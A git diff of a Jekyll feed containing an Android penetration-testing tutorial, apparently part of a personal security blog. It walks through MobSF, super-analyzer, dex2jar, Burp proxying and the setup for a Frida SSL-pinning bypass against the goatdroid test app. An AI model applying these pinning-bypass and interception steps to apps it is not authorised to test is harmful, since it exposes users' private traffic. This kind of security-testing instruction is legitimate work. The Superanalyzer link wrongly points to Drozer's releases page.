@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-21T07:24:26+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">rajatrao13</title><subtitle>devlopr-jekyll is a Jekyll Theme Built For Developers
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-21T21:11:01+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rajat.Rao</title><subtitle>devlopr-jekyll is a Jekyll Theme Built For Developers
 </subtitle><author><name>Rajat Rao</name></author><entry><title type="html">Mobile Security</title><link href="http://localhost:4000/hackthebox/2020/06/10/Mobile-Security/" rel="alternate" type="text/html" title="Mobile Security" /><published>2020-06-10T14:35:23+05:30</published><updated>2020-06-10T14:35:23+05:30</updated><id>http://localhost:4000/hackthebox/2020/06/10/Mobile-Security</id><content type="html" xml:base="http://localhost:4000/hackthebox/2020/06/10/Mobile-Security/">&lt;style&gt;
 * {
   box-sizing: border-box;
@@ -17,841 +17,824 @@ row::after {
 }
 &lt;/style&gt;
 
-&lt;p&gt;As security audit of web application are performed for multiple organization, a draw of interest can be made in Mobile applications as well.&lt;/p&gt;
+Just as security audits of web applications are performed for multiple organizations, a draw of interest can be made in Mobile applications as well.
 
-&lt;p&gt;The primary objective for a mobile application penetration test is to identify exploitable vulnerabilities in code, system, network, application, databases, Api’s etc before hackers are able to discover and exploit them. Application penetration testing will reveal real-world opportunities for hackers to be able to compromise application and databases in such a way that allows for unauthorized access to sensitive data or even take-over application for malicious/non-business purposes.&lt;/p&gt;
+The primary objective for a mobile application penetration test is to identify exploitable vulnerabilities in code, system, network, application, databases, Api's etc before hackers are able to discover and exploit them. Application penetration testing will reveal real-world opportunities for hackers to be able to compromise application and databases in such a way that allows for unauthorized access to sensitive data or even take-over application for malicious/non-business purposes.
 
-&lt;p&gt;Android Penetration testing can be implemented in any organization:&lt;/p&gt;
+Android Penetration focuses on three level on analysis
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1)Static:&lt;/code&gt; Checks with respect to code levels will be performed&lt;/p&gt;
+`1)Static:` Checks with respect to code levels will be performed
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2)Network:&lt;/code&gt; Intercepting the request sent by the android application and interaction between the application and server is audited.&lt;/p&gt;
+`2)Network:` Intercepting the request sent by the android application and interaction between the application and server is audited.
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;3)Interactive:&lt;/code&gt; While the applications provide its service, they tend to store a lot of confidential data in the respective mobile device itselfdynamically. An audit of the internal storage of the device is performed.&lt;/p&gt;
+`3)Interactive:` While the applications provide its service, they tend to store a lot of confidential data in the respective mobile device itself dynamically. An audit of the internal storage of the device is performed.
+	
+	
+The Mobile Security Series will be divided into the following chapters:
 
-&lt;p&gt;The Mobile Security Series will be divided into the following chapters:&lt;/p&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/2020/06/10/Mobile-Security/#chapter1&quot;&gt;Chapter 1: Android Application Fundamentals&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/2020/06/10/Mobile-Security/#chapter2&quot;&gt;Chapter 2: Setup Mobile Testing Platform&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/2020/06/10/Mobile-Security/#chapter3&quot;&gt;Chapter 3: Static Analysis&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/2020/06/10/Mobile-Security/#chapter4&quot;&gt;Chapter 4: Dynamic Analysis&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/2020/06/10/Mobile-Security/#chapter5&quot;&gt;Chapter 5: Interactive Analysis&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
+* [Chapter 1: Android Application Fundamentals]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter1)
+
+* [Chapter 2: Setup Mobile Testing Platform]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter2) 
+
+* [Chapter 3: Static Analysis]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter3)	
+
+* [Chapter 4: Dynamic Analysis]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter4)
+
+* [Chapter 5: Interactive Analysis]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter5)
 
 &lt;p id=&quot;chapter1&quot;&gt;&amp;nbsp;&lt;/p&gt;
 
 &lt;h2 id=&quot;chapter1&quot;&gt;Chapter 1: Android Application Fundamentals (Basics)&lt;/h2&gt;
 
-&lt;p&gt;An &lt;strong&gt;APK&lt;/strong&gt; is an archive that usually contains the following directories:&lt;/p&gt;
+An **APK** is an archive that usually contains the following directories:
 
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;AndroidManifest.xml&lt;/strong&gt;: It is a control file that tells the system what to do with all top-level components (&lt;strong&gt;service, activity, broadcast receiver and content provider&lt;/strong&gt;). It also contains the permission required for an application to run&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;META-INF&lt;/strong&gt; directory:&lt;/p&gt;
+- **AndroidManifest.xml**: It is a control file that tells the system what to do with all top-level components (**service, activity, broadcast receiver and content provider**). It also contains the permission required for an application to run
 
-    &lt;p&gt;  ◦ MANIFEST.MF: The Manifest File&lt;/p&gt;
+- **META-INF** directory:
 
-    &lt;p&gt;  ◦  CERT.RSA: The certificate of the applications&lt;/p&gt;
+	&amp;nbsp; ◦ MANIFEST.MF: The Manifest File
 
-    &lt;p&gt;  ◦  CERT.SF: The list of resources and SHA-1 digest of the corresponding lines in the MANIFEST.MF file.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;lib&lt;/strong&gt;: The directory containing the compiled code that is specific to a software layer of a processor, the directory is split into more directories within it&lt;/p&gt;
+	&amp;nbsp; ◦  CERT.RSA: The certificate of the applications
 
-    &lt;p&gt;  ◦  armeabi: compiled code for all ARM based processors only&lt;/p&gt;
+	&amp;nbsp; ◦  CERT.SF: The list of resources and SHA-1 digest of the corresponding lines in the MANIFEST.MF file.
 
-    &lt;p&gt;  ◦  armeabi-v7a: compiled code for all ARMv7 and above based processors only&lt;/p&gt;
+- **lib**: The directory containing the compiled code that is specific to a software layer of a processor, the directory is split into more directories within it
 
-    &lt;p&gt;  ◦  x86: compiled code for X86&lt;/p&gt;
+	&amp;nbsp; ◦  armeabi: compiled code for all ARM based processors only
 
-    &lt;p&gt;  ◦  mips: compiled code for MIPS processors only&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;res&lt;/strong&gt;: The directory containing resources not compiled into resources.arsc (see below).&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;assets&lt;/strong&gt;: A directory containing applications assets, which can be retrieved by AssetManager.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;classes.dex&lt;/strong&gt;: The classes compiled in the dex file format understandable by the Dalvik virtual machine&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;resources.arsc&lt;/strong&gt;: A file containing precompiled resources, such as binary XML for example.&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
+	&amp;nbsp; ◦  armeabi-v7a: compiled code for all ARMv7 and above based processors only
 
-&lt;p&gt; &lt;/p&gt;
+	&amp;nbsp; ◦  x86: compiled code for X86
 
-&lt;p&gt;Android Application assessment focuses on the below components:&lt;/p&gt;
+	&amp;nbsp; ◦  mips: compiled code for MIPS processors only
 
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;Content Provider&lt;/strong&gt;: It supplies data from one application to another. It can store the data in the file system, an SQLite Database, or the web, or any persistent storage location your app can access. It is used to share data among applications via queries such as insert(), update(), delete() and query()&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;Activity&lt;/strong&gt;: An activity represents a single screen with a user interface. For example, a login page can be called as an activity.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;Services&lt;/strong&gt;: A service is a component that runs in the background to perform long-running operations or to perform for remote processes and it does not have user interface. For example, Maps service running in the background&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;Broadcast Receivers&lt;/strong&gt;: A broadcast receiver is a component that responds to system-wide broadcast announcements&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
+- **res**: The directory containing resources not compiled into resources.arsc (see below).
 
-&lt;p&gt; &lt;/p&gt;
+- **assets**: A directory containing applications assets, which can be retrieved by AssetManager.
+
+- **classes.dex**: The classes compiled in the dex file format understandable by the Dalvik virtual machine
+
+- **resources.arsc**: A file containing precompiled resources, such as binary XML for example.
+
+&amp;nbsp; 
+
+Android Application assessment focuses on the below components:
+
+- **Content Provider**: It supplies data from one application to another. It can store the data in the file system, an SQLite Database, or the web, or any persistent storage location your app can access. It is used to share data among applications via queries such as insert(), update(), delete() and query()
+
+- **Activity**: An activity represents a single screen with a user interface. For example, a login page can be called as an activity.
+
+- **Services**: A service is a component that runs in the background to perform long-running operations or to perform for remote processes and it does not have user interface. For example, Maps service running in the background
+
+- **Broadcast Receivers**: A broadcast receiver is a component that responds to system-wide broadcast announcements
+
+&amp;nbsp; 
 &lt;p id=&quot;chapter2&quot;&gt;&amp;nbsp;&lt;/p&gt;
 
 &lt;h2 id=&quot;chapter2&quot;&gt;Chapter 2: Setup Mobile Testing Platform  &lt;/h2&gt;
 
-&lt;p&gt;Setting up an environment for any security assessment is a must. For Android Security, it is suggested to be dependent more on Kali Linux/Tamer operating system. &lt;b&gt;Kali Linux&lt;/b&gt; is an advanced penetration testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments.&lt;b&gt;Android Tamer&lt;/b&gt; is a virtual/live platform for Android Security professionals where all the tools are inculcated within the OS.&lt;/p&gt;
+Setting up an environment for any security assessment is a must. For Android Security, it is suggested to be dependent more on Kali Linux/Tamer operating system. &lt;b&gt;Kali Linux&lt;/b&gt; is an advanced penetration testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments.&lt;b&gt;Android Tamer&lt;/b&gt; is a virtual/live platform for Android Security professionals where all the tools are inculcated within the OS. 
 
-&lt;p&gt;The very first step is to install Virtual Kali Linux/Android Tamer on Vmware. Following is the list of useful URLs for downloads:&lt;/p&gt;
+The very first step is to install Virtual Kali Linux/Android Tamer on Vmware. Following is the list of useful URLs for downloads:
 
-&lt;p&gt;&lt;b&gt;VMware&lt;/b&gt;: &lt;a href=&quot;https://www.vmware.com/in/products/workstation-player/workstation-player-evaluation.html&quot;&gt;https://www.vmware.com/in/products/workstation-player/workstation-player-evaluation.html&lt;/a&gt;&lt;/p&gt;
+&lt;b&gt;VMware&lt;/b&gt;: [https://www.vmware.com/in/products/workstation-player/workstation-player-evaluation.html](https://www.vmware.com/in/products/workstation-player/workstation-player-evaluation.html)
 
-&lt;p&gt;&lt;b&gt;Kali Linux&lt;/b&gt;: &lt;a href=&quot;https://www.kali.org/downloads/&quot;&gt;https://www.kali.org/downloads/&lt;/a&gt;&lt;/p&gt;
+&lt;b&gt;Kali Linux&lt;/b&gt;: [https://www.kali.org/downloads/](https://www.kali.org/downloads/)
 
-&lt;p&gt;&lt;b&gt;Android Tamer&lt;/b&gt;: &lt;a href=&quot;https://androidtamer.com/tamer4-release&quot;&gt;https://androidtamer.com/tamer4-release&lt;/a&gt;&lt;/p&gt;
+&lt;b&gt;Android Tamer&lt;/b&gt;: [https://androidtamer.com/tamer4-release](https://androidtamer.com/tamer4-release)
 
-&lt;p&gt;For newbies into cyber security, we’ll be creating content for installation steps for &lt;b&gt;VMWare&lt;/b&gt; and &lt;b&gt;virtual machines&lt;/b&gt; (.iso and .ova)&lt;/p&gt;
+For newbies into cyber security, we'll be creating a dedicated post for installation steps for &lt;b&gt;VMWare&lt;/b&gt; and &lt;b&gt;virtual machines&lt;/b&gt; (.iso and .ova) in near future.
 
-&lt;p&gt;For assessing Mobile application, we need a dedicated android testing device to perform assessments. However, the same can be performed by creating a virtual Android environment with the help of a tool named Genymotion. It is a Cross-platform Android Emulator for developers &amp;amp; QA engineers. It is dependent on VirtualBox. Following is the list of URL for downloads-&lt;/p&gt;
+For assessing Mobile application, we need a dedicated android testing device to perform assessments. However, the same can be performed by creating a virtual Android environment with the help of a tool named Genymotion. It is a Cross-platform Android Emulator for developers &amp; QA engineers. It is dependent on VirtualBox. Following is the list of URL for downloads-
 
-&lt;p&gt;&lt;b&gt;VirtualBox&lt;/b&gt;: &lt;a href=&quot;https://www.virtualbox.org/wiki/Downloads&quot;&gt;https://www.virtualbox.org/wiki/Downloads&lt;/a&gt;&lt;/p&gt;
+&lt;b&gt;VirtualBox&lt;/b&gt;: [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)
 
-&lt;p&gt;&lt;b&gt;Genymotion&lt;/b&gt;: &lt;a href=&quot;https://www.genymotion.com/fun-zone/&quot;&gt;https://www.genymotion.com/fun-zone/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt; &lt;/p&gt;
-
+&lt;b&gt;Genymotion&lt;/b&gt;: [https://www.genymotion.com/fun-zone/](https://www.genymotion.com/fun-zone/)    
+     
+&amp;nbsp;
+      
 &lt;h3&gt;2.1 || Genymotion&lt;/h3&gt;
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Start Genymotion&lt;/code&gt;&lt;/p&gt;
+--&gt; `Start Genymotion`
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/1.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/1.png){:class=&quot;img-fluid&quot;}
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Add Virtual Device&lt;/code&gt;&lt;/p&gt;
+--&gt; `Add Virtual Device`
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/2.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/2.png){:class=&quot;img-fluid&quot;}
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Select Google Pixel XL with API &amp;gt;=6.0 and click Next&lt;/code&gt;&lt;/p&gt;
+--&gt; `Select Google Pixel XL with API &gt;=6.0 and click Next`
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/3.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/3.png){:class=&quot;img-fluid&quot;}
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Install the selected emulator&lt;/code&gt;&lt;/p&gt;
+--&gt; `Install the selected emulator`
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/4.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/4.png){:class=&quot;img-fluid&quot;}
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/5.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt; &lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/5.png){:class=&quot;img-fluid&quot;}  
+
+&amp;nbsp;
 
 &lt;h3&gt;2.2 || Required tools&lt;/h3&gt;
 
-&lt;p&gt;Once genymotion is installed, the next step for android security assessments is to setup following list of tools in &lt;b&gt;Kali Linux&lt;/b&gt;:&lt;/p&gt;
+Once genymotion is installed, the next step for android security assessments is to setup following list of tools in &lt;b&gt;Kali Linux&lt;/b&gt;:
 
-&lt;p&gt;&lt;b&gt;Mobsf (Docker)&lt;/b&gt;: &lt;a href=&quot;https://github.com/MobSF/Mobile-Security-Framework-MobSF&quot;&gt;https://github.com/MobSF/Mobile-Security-Framework-MobSF&lt;/a&gt;&lt;/p&gt;
+&lt;b&gt;Mobsf (Docker)&lt;/b&gt;: [https://github.com/MobSF/Mobile-Security-Framework-MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) 
 
-&lt;p&gt;&lt;b&gt;Drozer&lt;/b&gt;: &lt;a href=&quot;https://github.com/FSecureLABS/drozer/releases&quot;&gt;https://github.com/FSecureLABS/drozer/releases&lt;/a&gt;&lt;/p&gt;
+&lt;b&gt;Drozer&lt;/b&gt;: [https://github.com/FSecureLABS/drozer/releases](https://github.com/FSecureLABS/drozer/releases) 
 
-&lt;p&gt;&lt;b&gt;Superanalyzer&lt;/b&gt;: &lt;a href=&quot;https://github.com/FSecureLABS/drozer/releases&quot;&gt;https://github.com/FSecureLABS/drozer/releases&lt;/a&gt;&lt;/p&gt;
-
+&lt;b&gt;Superanalyzer&lt;/b&gt;: [https://github.com/FSecureLABS/drozer/releases](https://github.com/FSecureLABS/drozer/releases)  
+  
 &lt;p id=&quot;chapter3&quot;&gt;&amp;nbsp;&lt;/p&gt;
 
 &lt;h2&gt;Chapter 3: Static Analysis  &lt;/h2&gt;
 
-&lt;p&gt;Static Application Security Testing is a set of technologies designed to analyze the application source code that are indicative of security vulnerabilities. Now as required tools are installed, we can start with security assessment of Android Applications/&lt;/p&gt;
+Static Application Security Testing is a set of technologies designed to analyze the application source code that are indicative of security vulnerabilities. Now as required tools are installed, we can start with security assessment of Android Applications.
 
 &lt;h3&gt;3.1 || Mobsf (Docker)&lt;/h3&gt;
 
-&lt;p&gt;&lt;b&gt;Mobile Security Framework (MobSF)&lt;/b&gt; is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware-analysis and security assessment framework capable of performing static and dynamic analysis.&lt;/p&gt;
+&lt;b&gt;Mobile Security Framework (MobSF)&lt;/b&gt; is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware-analysis and security assessment framework capable of performing static and dynamic analysis.
 
-&lt;p&gt;In this section of &lt;b&gt;Mobsf&lt;/b&gt;, we’ll be focusing more on static analysis.&lt;/p&gt;
+In this section of &lt;b&gt;Mobsf&lt;/b&gt;, we’ll be focusing more on static analysis.
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Start mobsf via Docker&lt;/code&gt;&lt;/p&gt;
+--&gt; `Start mobsf via Docker`
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;$ cd Mobile-Security-Framework-MobSF&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;$ docker build -t mobsf .&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;$ docker run -it -p 8000:8000 mobsf&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Upload and Scan APK&lt;/code&gt;&lt;/p&gt;
+```yml
+$ git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
+$ cd Mobile-Security-Framework-MobSF
+$ docker build -t mobsf .
+$ docker run -it -p 8000:8000 mobsf
+```
+--&gt; `Upload and Scan APK`
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/6.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/6.png){:class=&quot;img-fluid&quot;}  
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/7.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/7.png){:class=&quot;img-fluid&quot;}  
 
-&lt;p&gt; &lt;/p&gt;
-
+  &amp;nbsp; 
+  
 &lt;h3&gt;3.2 || Superanalyzer &lt;/h3&gt;
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Run Superanalyzer against APK&lt;/code&gt;&lt;/p&gt;
+--&gt; `Run Superanalyzer against APK`
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ super-analyzer -v goatdroid.apk&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;The output of the super-anaylzer is stored in the form of HTML and can view defects found with respect to the application.&lt;/p&gt;
+```yml
+$ super-analyzer -v goatdroid.apk
+```
+The output of the super-anaylzer is stored in the form of HTML and can view defects found with respect to the application.
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/8.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/8.png){:class=&quot;img-fluid&quot;}  
 
-&lt;p&gt; &lt;/p&gt;
+  &amp;nbsp; 
+  
+&lt;h3&gt;3.3 || d2j-dex2jar &amp; jd-gui &lt;/h3&gt;
+	
+&lt;b&gt;d2j-dex2jar&lt;/b&gt; tool helps one to reverse engineer the apk to jar version of it. The jar version helps to displays the code and can be examined for security purposes.
 
-&lt;h3&gt;3.3 || d2j-dex2jar &amp;amp; jd-gui &lt;/h3&gt;
-
-&lt;p&gt;&lt;b&gt;d2j-dex2jar&lt;/b&gt; tool helps one to reverse engineer the apk to jar version of it. The jar version helps to displays the code and can be examined for security purposes.&lt;/p&gt;
-
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$d2j-dex2jar goatdroid.apk&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;$jd-gui → select jar file of goatdroid apk&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/9.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+```yml
+$d2j-dex2jar goatdroid.apk
+$jd-gui → select jar file of goatdroid apk
+```
+![deploy using travis](/assets/img/posts/Mobile_Security/9.png){:class=&quot;img-fluid&quot;}  
 
 &lt;p id=&quot;chapter4&quot;&gt;&amp;nbsp;&lt;/p&gt;
 
 &lt;h2&gt;Chapter 4: Network Analysis &lt;/h2&gt;
 
-&lt;p&gt;Network analysis deals with communication of application with the server providing data. Here, analysis is done similarly the way analysis of web application is done by setting a proxy and intercepting every request to &lt;b&gt;Burpsuite&lt;/b&gt;.&lt;/p&gt;
+Network analysis deals with communication of application with the server providing data. Here, analysis is done similarly the way analysis of web application is done by setting a proxy and intercepting every request to &lt;b&gt;Burpsuite&lt;/b&gt;.
 
 &lt;h3&gt;4.1 || Setup Proxy in Mobile &lt;/h3&gt;
 
 &lt;div class=&quot;row&quot;&gt;
   &lt;div class=&quot;column&quot;&gt;
-    &lt;img src=&quot;/assets/img/posts/Mobile_Security/10.png&quot; alt=&quot;Snow&quot; style=&quot;width:100%&quot; /&gt;
+    &lt;img src=&quot;/assets/img/posts/Mobile_Security/10.png&quot; alt=&quot;Snow&quot; style=&quot;width:100%&quot;&gt;
     &lt;figcaption style=&quot;text-align: center;&quot;&gt;Fig.1 &lt;/figcaption&gt;
 
   &lt;/div&gt;
   &lt;div class=&quot;column&quot;&gt;
-    &lt;img src=&quot;/assets/img/posts/Mobile_Security/11.png&quot; alt=&quot;Forest&quot; style=&quot;width:100%&quot; /&gt;
+    &lt;img src=&quot;/assets/img/posts/Mobile_Security/11.png&quot; alt=&quot;Forest&quot; style=&quot;width:100%&quot;&gt;
     &lt;figcaption style=&quot;text-align: center;&quot;&gt;Fig.2 &lt;/figcaption&gt;
   &lt;/div&gt;
   &lt;div class=&quot;column&quot;&gt;
-    &lt;img src=&quot;/assets/img/posts/Mobile_Security/12.png&quot; alt=&quot;Mountains&quot; style=&quot;width:100%&quot; /&gt;
+    &lt;img src=&quot;/assets/img/posts/Mobile_Security/12.png&quot; alt=&quot;Mountains&quot; style=&quot;width:100%&quot;&gt;
     &lt;figcaption style=&quot;text-align: center;&quot;&gt;Fig.3 &lt;/figcaption&gt;
   &lt;/div&gt;
-&lt;/div&gt;
+&lt;/div&gt; 
 
-&lt;p&gt; &lt;/p&gt;
+  &amp;nbsp; 
 
 &lt;h3&gt;4.2 || SSL Pinning and Root Detection Bypass &lt;/h3&gt;
 
-&lt;p&gt;Here, SSL Pinning allows the application to only trust the valid or pre-definedcertificate or Public Key. The application developer uses SSL Pinning technique as an additional layer for application traffic.&lt;/p&gt;
+Here, SSL Pinning allows the application to only trust the valid or pre-defined certificate or Public Key. The application developer uses SSL Pinning technique as an additional layer for application traffic.
 
-&lt;p&gt;Below we are going to discuss about steps to bypass SSL Pinning.&lt;/p&gt;
+Below we are going to discuss about steps to bypass SSL Pinning.
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Install Frida&lt;/code&gt;&lt;/p&gt;
+--&gt; `Install Frida`
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ pip3 install frida&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;$ pip3 install objection&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;$ pip3 install frida-tools&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Download the fridascript.js script for hooking from the following link:&lt;a href=&quot;https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/&quot;&gt;https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/&lt;/a&gt;&lt;/p&gt;
+```yml
+$ pip3 install frida
+$ pip3 install objection
+$ pip3 install frida-tools
+```
+Download the fridascript.js script for hooking from the following link:[https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/](https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/)
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Connect Device to ADB&lt;/code&gt;&lt;/p&gt;
+--&gt; `Connect Device to ADB`
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ adb connect 192.18.0.105:5555&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;$ adb devices (To check connected devices)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Find and Install Target application (Frida server) in device&lt;/code&gt;&lt;/p&gt;
+```yml
+$ adb connect 192.18.0.105:5555
+$ adb devices (To check connected devices)
+```
+--&gt; `Find and Install Target application (Frida server) in device`
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ adb shell getprop ro.product.cpu.abi (To check architecture of device)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Download the Frida Server script according to above command output from the following link: &lt;a href=&quot;https://github.com/frida/frida/releases/&quot;&gt;https://github.com/frida/frida/releases/&lt;/a&gt;&lt;/p&gt;
+```yml
+$ adb shell getprop ro.product.cpu.abi (To check architecture of device)
+```
